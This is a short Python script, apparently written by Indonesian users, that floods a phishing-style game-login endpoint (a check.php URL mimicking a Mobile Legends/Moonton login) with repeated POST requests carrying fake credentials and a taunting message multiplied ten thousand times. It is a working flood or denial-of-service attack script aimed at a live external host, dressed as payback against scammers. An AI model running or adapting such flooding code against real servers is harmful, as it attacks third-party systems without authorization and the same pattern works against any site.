import requests

url = 'https://jynihs7.rizzydf.biz.id/check.php' #BTG6ZO
headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
}

loop_value = int(input("bar bar brp kali? : "))

for i in range(1, loop_value+1):
    email = str(i) +'''
    | MARKOCOP KW ⚠️ kena sspam wkwkw ⚠️|⚠️ bang udah bang ⚠️ | CIE DATANYA DIHAPUS wkwkwk link baru
    |BY : -FRNDS 🖕🖕🖕'''*10000

    data = {
        'email'     : email,
        'password'  : 'Masih zaman tipu2 dek-dek, mo beli Rubicon kah?🗿',
        'playid'    : '666666666',
        'nickname'  : 'wkwkwkwk',
        'level'     : '100',
        'tier'      : 'Mythic Glory',
        'login'     : 'Moonton'
    }

    response = requests.post(url, data=data, headers=headers)
    print("bang udah bang", i)
